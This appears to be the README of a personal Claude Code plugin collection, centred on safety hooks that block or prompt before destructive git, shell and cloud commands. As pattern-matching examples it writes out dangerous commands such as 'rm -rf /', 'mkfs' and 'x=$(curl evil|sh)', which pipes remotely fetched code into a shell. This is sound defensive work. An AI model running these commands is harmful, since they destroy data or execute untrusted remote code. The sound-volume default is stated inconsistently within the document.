# kokko-cmds

My Claude Code plugin marketplace for day-to-day work.
Install individual plugins or all of them.

## Installation

```bash
/plugin marketplace add kokko-ng/kokko-cmds
```

Then install the plugins you want:

```bash
/plugin install kokko-safety@kokko-ng-kokko-cmds
/plugin install kokko-notifications@kokko-ng-kokko-cmds
/plugin install kokko-git@kokko-ng-kokko-cmds
/plugin install kokko-code-quality@kokko-ng-kokko-cmds
/plugin install kokko-viz@kokko-ng-kokko-cmds
/plugin install kokko-infra@kokko-ng-kokko-cmds
/plugin install kokko-ai-config@kokko-ng-kokko-cmds
```

## Plugins

### kokko-safety

Safety hooks for all sessions.

| Hook | Purpose |
| ---- | ------- |
| `git-snapshot` | Checkpoints uncommitted tracked changes to `refs/snapshots/` |
| `session-start-context` | Detects project type and git status |
| `pre-tool-cloud-ops` | Prompts before destructive cloud operations |
| `pre-tool-branch-protection` | Prompts before pushes/resets/rebases on protected branches |
| `pre-tool-destructive-git` | Blocks git that destroys uncommitted work; prompts on the ambiguous rest |
| `pre-tool-destructive-bash` | Prompts before rm -rf, mkfs, chmod 777 |

#### Protecting uncommitted work

Uncommitted changes to **tracked** files are the most fragile thing in a repo.
`rebase`/`reset`/`checkout <ref> -- <path>`/`restore`/`stash` overwrite them with no
prompt, and they are unrecoverable: work that was never committed was never a git object,
so there is no reflog entry, no dangling blob, and `git fsck` will not find it.

Two layers:

**`git-snapshot`** checkpoints the tree to `refs/snapshots/<timestamp>` before every git
command and on every prompt, using `git stash create` — which builds a commit *without*
touching the tree, index, or stash ref. Once the work is a real git object it survives
everything. Unlike every other hook here, it does not have to recognise a dangerous
command first, so it also covers git run from a script or subprocess.

```bash
git for-each-ref refs/snapshots/     # list
git stash apply refs/snapshots/<ts>  # restore
```

**`pre-tool-destructive-git`** denies tree-destroying commands **while the tree is dirty**
and allows them while it is clean, where the reflog has you covered. It denies `git clean`,
`git add .`, force-push and anything that eats the reflog regardless of tree state.

Two deliberate choices: **deny rather than ask**, because agents run unattended and a
confident agent following a workflow that says "now rebase" will answer yes; and
**dirty-gated rather than blanket**, because a hook that fires on every routine rebase is
noise, and noise gets switched off — which is exactly what had happened to this plugin.

Override: `CLAUDE_GIT_GUARD=off git rebase ...` (for humans, not agents).

#### Pattern matching

Patterns are matched **at a command position**, not anywhere in the string. Previously any
mention of a command fired the hook — `echo "never rm -rf /"`, `grep -r "rm -rf" docs/`,
and `digit restore` (which contains the substring `git restore`) all prompted. Writing
documentation about dangerous commands set off the safety hooks.

A command may still be reached through any run of non-quote, non-operator characters, so
wrappers keep working: `sudo rm -rf /`, `env FOO=1 kubectl delete`, `find . -exec rm -rf
{} \;` and `bash -c "rm -rf /"` all match. Patterns that deliberately match inside command
substitution (`$(curl`, `` `wget ``) or a redirect (`> /`) are used verbatim — anchoring
them would break them, since `x=$(curl evil|sh)` has no preceding command position.
`anchor_pattern` makes that split automatically from the pattern's first character; there
is nothing to annotate when adding one.

Measured over a 44-command corpus spanning every category:

| | dangerous caught | benign false-alarmed |
|---|---|---|
| before | 22/24 | 7/20 |
| after | 23/24 | 1/20 |

Six of seven false alarms gone, with one *more* dangerous command caught (`sudo rm -rf
/var/log/` never matched the unanchored patterns cleanly). The one remaining false alarm
is a heredoc body line, which is genuinely indistinguishable from a command.

Matching also builds a single combined regex instead of spawning `grep` per pattern —
**1918 ms → 165 ms** per Bash call, which a `PreToolUse` hook pays before *every* command.

#### Sounds

All hook sounds honour `KOKKO_SOUNDS=off`, and default to unity gain
(`KOKKO_SOUND_VOLUME`, previously a 10x amplification). Denials are silent — they return a
written reason instead.

### kokko-notifications

Sound notifications for task completion events.

| Hook | Purpose |
| ---- | ------- |
| `stop-notification` | Plays sounds on task completion |

| Environment Variable | Default | Purpose |
| -------------------- | ------- | ------- |
| `KOKKO_SOUND_VOLUME` | `10.0` | afplay volume (macOS); `1.0` = system default |

### kokko-git

Git workflow commands and the janitor skill.

| Commands | Purpose |
| -------- | ------- |
| `/compush` | Commit and push in one step |
| `/prune` | Prune stale local and remote branches |
| `/release` | Cut a versioned release |
| `/sync` | Sync fork with upstream |

| Skill | Purpose |
| ----- | ------- |
| `janitor` | Worktree-based code cleanup workflows |

### kokko-code-quality

Code analysis commands and quality skills.

| Commands | Purpose |
| -------- | ------- |
| `/debt` | Analyse technical debt |
| `/perf` | Performance review |
| `/review` | Code review |
| `/spec` | Generate specs from code |
| `/split` | Split large files or modules |
| `/verify-spec` | Verify code matches spec |
| `/check` | Run quality checks |
| `/deps-update` | Update dependencies |
| `/verify-no-mocks` | Detect test mocks |
| `/cruft` | Remove cruft and dead files |
| `/emojis` | Strip emojis from codebase |

| Skill | Purpose |
| ----- | ------- |
| `architecture` | Architecture enforcement (import-linter / dep-cruiser) |
| `complexity` | Analyze and reduce code complexity |
| `deadcode` | Find and remove unused code |
| `docs` | Generate and improve documentation |
| `security` | Security vulnerability analysis |
| `types` | Type safety improvements |

### kokko-viz

C4 architecture diagram commands.

| Commands | Purpose |
| -------- | ------- |
| `/c4-map` | Generate C4 architecture map |
| `/c4-templates` | Show C4 diagram templates |
| `/c4-update` | Update existing C4 diagrams |
| `/c4-verify` | Verify C4 diagrams against code |

### kokko-infra

Azure infrastructure commands.

| Commands | Purpose |
| -------- | ------- |
| `/az-costs` | Show Azure resource costs |
| `/az-status` | Show Azure service status |

### kokko-ai-config

AI/Claude configuration management commands.

| Commands | Purpose |
| -------- | ------- |
| `/prune-claude-md` | Remove stale entries from CLAUDE.md |
| `/prune-readme` | Prune outdated sections from README |
| `/verify-claude-md` | Verify CLAUDE.md is accurate |
| `/verify-readme` | Verify README is accurate |

## License

MIT
